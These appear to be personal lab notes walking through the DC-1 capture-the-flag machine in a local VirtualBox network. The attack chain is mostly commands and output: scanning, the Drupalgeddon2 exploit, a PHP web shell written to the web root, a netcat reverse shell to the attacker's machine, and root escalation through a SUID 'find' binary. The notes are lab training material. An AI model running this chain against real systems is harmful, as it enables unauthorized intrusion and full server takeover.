
---
tags
	#SUID
---

```bash
nmap -sV -sC -Pn 192.168.56.104                                                                                
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-15 09:26 -0500
Nmap scan report for 192.168.56.104
Host is up (0.000077s latency).
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 6.0p1 Debian 4+deb7u7 (protocol 2.0)
| ssh-hostkey: 
|   1024 c4:d6:59:e6:77:4c:22:7a:96:16:60:67:8b:42:48:8f (DSA)
|   2048 11:82:fe:53:4e:dc:5b:32:7f:44:64:82:75:7d:d0:a0 (RSA)
|_  256 3d:aa:98:5c:87:af:ea:84:b8:23:68:8d:b9:05:5f:d8 (ECDSA)
80/tcp  open  http    Apache httpd 2.2.22 ((Debian))
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
|_http-generator: Drupal 7 (http://drupal.org)
|_http-title: Welcome to Drupal Site | Drupal Site
|_http-server-header: Apache/2.2.22 (Debian)
111/tcp open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          36654/udp6  status
|   100024  1          46076/tcp6  status
|   100024  1          56495/tcp   status
|_  100024  1          57166/udp   status
MAC Address: 08:00:27:E4:96:D8 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.92 seconds

```

```bash
gobuster dir -u http://192.168.56.104 -w /home/kali/CyberSec/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-small.txt
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.56.104
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /home/kali/CyberSec/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
search               (Status: 403) [Size: 7563]
misc                 (Status: 301) [Size: 315] [--> http://192.168.56.104/misc/]
themes               (Status: 301) [Size: 317] [--> http://192.168.56.104/themes/]
0                    (Status: 200) [Size: 7627]
user                 (Status: 200) [Size: 7480]
modules              (Status: 301) [Size: 318] [--> http://192.168.56.104/modules/]
admin                (Status: 403) [Size: 7718]
scripts              (Status: 301) [Size: 318] [--> http://192.168.56.104/scripts/]
node                 (Status: 200) [Size: 7627]
sites                (Status: 301) [Size: 316] [--> http://192.168.56.104/sites/]
includes             (Status: 301) [Size: 319] [--> http://192.168.56.104/includes/]
profiles             (Status: 301) [Size: 319] [--> http://192.168.56.104/profiles/]
robots               (Status: 200) [Size: 1561]
Progress: 10771 / 81642 (13.19%)
```

rpcinfo : Makes an RPC call to an RPC server and reports what it finds.

-p : Display a  list of all registered RPC programs.

```bash
rpcinfo -p 192.168.56.104
   program vers proto   port  service
    100000    4   tcp    111  portmapper
    100000    3   tcp    111  portmapper
    100000    2   tcp    111  portmapper
    100000    4   udp    111  portmapper
    100000    3   udp    111  portmapper
    100000    2   udp    111  portmapper
    100024    1   udp  57166  status
    100024    1   tcp  56495  status

```

No nfs(Network File System) exist, `rpcinfo` is not the main breakthrough.

```bash
curl -I 192.168.56.104
HTTP/1.1 200 OK
Date: Sun, 15 Feb 2026 16:12:17 GMT
Server: Apache/2.2.22 (Debian)
X-Powered-By: PHP/5.4.45-0+deb7u14
Expires: Sun, 19 Nov 1978 05:00:00 GMT
Last-Modified: Sun, 15 Feb 2026 16:12:17 +0000
Cache-Control: no-cache, must-revalidate, post-check=0, pre-check=0
ETag: "1771171937"
Content-Language: en
X-Generator: Drupal 7 (http://drupal.org)
Vary: Accept-Encoding
Content-Type: text/html; charset=utf-8

```

```bash
searchsploit drupal 7 remote
---------------------------------------------------------------------------------
 Exploit Title                                                                                                                                                  |  Path
---------------------------------------------------------------------------------
Drupal 4.7 - 'Attachment mod_mime' Remote Command Execution                                                                                                     | php/webapps/1821.php
Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (Remote Code Execution)                                                                                        | php/webapps/35150.php
Drupal 7.x Module Services - Remote Code Execution                                                                                                              | php/webapps/41564.php
Drupal < 4.7.6 - Post Comments Remote Command Execution                                                                                                         | php/webapps/3313.pl
Drupal < 5.1 - Post Comments Remote Command Execution                                                                                                           | php/webapps/3312.pl
Drupal < 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code (Metasploit)                                                                                        | php/webapps/44557.rb
Drupal < 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code (Metasploit)                                                                                        | php/webapps/44557.rb
Drupal < 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code Execution (PoC)                                                                                     | php/webapps/44542.txt
Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution                                                                             | php/webapps/44449.rb
Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution (Metasploit)                                                                         | php/remote/44482.rb
Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution (Metasploit)                                                                         | php/remote/44482.rb
Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution (PoC)                                                                                | php/webapps/44448.py
Drupal < 8.5.11 / < 8.6.10 - RESTful Web Services unserialize() Remote Command Execution (Metasploit)                                                           | php/remote/46510.rb
Drupal < 8.5.11 / < 8.6.10 - RESTful Web Services unserialize() Remote Command Execution (Metasploit)                                                           | php/remote/46510.rb
Drupal < 8.6.10 / < 8.5.11 - REST Module Remote Code Execution                                                                                                  | php/webapps/46452.txt
Drupal < 8.6.9 - REST Module Remote Code Execution                                                                                                              | php/webapps/46459.py
Drupal Module CODER 2.5 - Remote Command Execution (Metasploit)                                                                                                 | php/webapps/40149.rb
Drupal Module Coder < 7.x-1.3/7.x-2.6 - Remote Code Execution                                                                                                   | php/remote/40144.php
Drupal Module RESTWS 7.x - PHP Remote Code Execution (Metasploit)                                                                                               | php/remote/40130.rb
---------------------------------------------------------------------------------
Shellcodes: No Results


```


Drupalgeddon SQL Injection : 
	`?q=` query parameter was historically used to pass the internal system path to the main `index.php` file, which then processed the request. For example, a request for the page "about-us" would internally be processed as `index.php?q=about-us`.This parameter is a technical detail of how Drupal 7 and earlier versions handled URL routing, especially when "Clean URLs" were not enabled.

CVE : Common Vulnerabilities and Exposures

```bash
searchsploit -x 44449.rb

  Exploit: Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution
      URL: https://www.exploit-db.com/exploits/44449
     Path: /usr/share/exploitdb/exploits/php/webapps/44449.rb
    Codes: CVE-2018-7600
 Verified: True
File Type: Ruby script, ASCII text

```

[[../CVE-2018-7600 breakdown]]

```bash
 searchsploit -m 44449

  Exploit: Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution
      URL: https://www.exploit-db.com/exploits/44449
     Path: /usr/share/exploitdb/exploits/php/webapps/44449.rb
    Codes: CVE-2018-7600
 Verified: True
File Type: Ruby script, ASCII text
Copied to: /home/kali/CyberSec/44449.rb

```

```bash
sudo gem install highline
```

```bash
ruby "44449.rb" http://192.168.56.104
[*] --==[::#Drupalggedon2::]==--
--------------------------------------------------------------------------------
[i] Target : http://192.168.56.104/
--------------------------------------------------------------------------------
[!] MISSING: http://192.168.56.104/CHANGELOG.txt    (HTTP Response: 404)
[!] MISSING: http://192.168.56.104/core/CHANGELOG.txt    (HTTP Response: 404)
[+] Found  : http://192.168.56.104/includes/bootstrap.inc    (HTTP Response: 403)
[!] MISSING: http://192.168.56.104/core/includes/bootstrap.inc    (HTTP Response: 404)
[+] Found  : http://192.168.56.104/includes/database.inc    (HTTP Response: 403)
[+] URL    : v7.x/6.x?
[+] Found  : http://192.168.56.104/    (HTTP Response: 200)
[+] Metatag: v7.x/6.x [Generator]
[!] MISSING: http://192.168.56.104/    (HTTP Response: 200)
[+] Drupal?: v7.x/6.x
--------------------------------------------------------------------------------
[*] Testing: Form   (user/password)
[+] Result : Form valid
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[*] Testing: Clean URLs
[+] Result : Clean URLs enabled
--------------------------------------------------------------------------------
[*] Testing: Code Execution   (Method: name)
[i] Payload: echo KMSSYELD
[+] Result : KMSSYELD
[+] Good News Everyone! Target seems to be exploitable (Code execution)! w00hooOO!
--------------------------------------------------------------------------------
[*] Testing: Existing file   (http://192.168.56.104/shell.php)
[i] Response: HTTP 404 // Size: 13
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[*] Testing: Writing To Web Root   (./)
[i] Payload: echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d | tee shell.php
[+] Result : <?php if( isset( $_REQUEST['c'] ) ) { system( $_REQUEST['c'] . ' 2>&1' ); }
[+] Very Good News Everyone! Wrote to the web root! Waayheeeey!!!
--------------------------------------------------------------------------------
[i] Fake PHP shell:   curl 'http://192.168.56.104/shell.php' -d 'c=hostname'
DC-1>>
```

```bash
❯ nc -lvnp 4444
listening on [any] 4444 ...
```

-v : reverse -n : don't do DNS Resolution

```bash
DC-1>>nc 192.168.56.103 4444 -e /bin/bash
```

-e : After the connection, execute a program and bind the input/output of this program to the TCP connection.

```bash
connect to [192.168.56.103] from (UNKNOWN) [192.168.56.104] 33460

script -qc /bin/bash /dev/null
www-data@DC-1:/var/www$
```

script is a Linux tool to open a new pseudo-terminal(PTY) and record all the session. 

```
fork()
openpty()
exec()
```

-q : do not display banner -c : designate the command 

So now we get a stable reverse shell.

```bash
www-data@DC-1:/var/www$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

```bash
www-data@DC-1:/var/www$ cat /etc/passwd | grep -v 'false\|nologin'
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
flag4:x:1001:1001:Flag4,,,:/home/flag4:/bin/bash
```

`/etc/passwd` format :

`username:password:UID:GID:comment:home:shell`

UID > = 1000 are users generally.

nobody is a Linux default low privilege account, which designed to execute programs.

```
d | rwx | rwx | rwx
    ↑     ↑     ↑
   owner group others
   
r = 4
w = 2
x = 1
```

```bash
www-data@DC-1:/var/www$ cd /home/flag4
```

```bash
www-data@DC-1:/home/flag4$ cat flag4.txt
Can you use this same method to find or access the flag in root?

Probably. But perhaps it's not that easy.  Or maybe it is?
```

```bash
find / -perm -u+s -type f 2>/dev/null
```

Finding all programs will execute with root privilege.
`-type f` : find normal files only
`-perm` : finding file according to privilege
`u` = Users `s` = SUID bit

```bash
/bin/mount
/bin/ping
/bin/su
/bin/ping6
/bin/umount
/usr/bin/at
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/procmail
/usr/bin/find
/usr/sbin/exim4
/usr/lib/pt_chown
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/sbin/mount.nfs
```

```bash
/usr/bin/find . -exec /bin/bash -p \; -quit
```

```bash
bash-4.2# cd /root
bash-4.2# ls
thefinalflag.txt
bash-4.2# cat thefinalflag.txt
Well done!!!!

Hopefully you've enjoyed this and learned some new skills.

You can let me know what you thought of this little journey
by contacting me via Twitter - @DCAU7
```

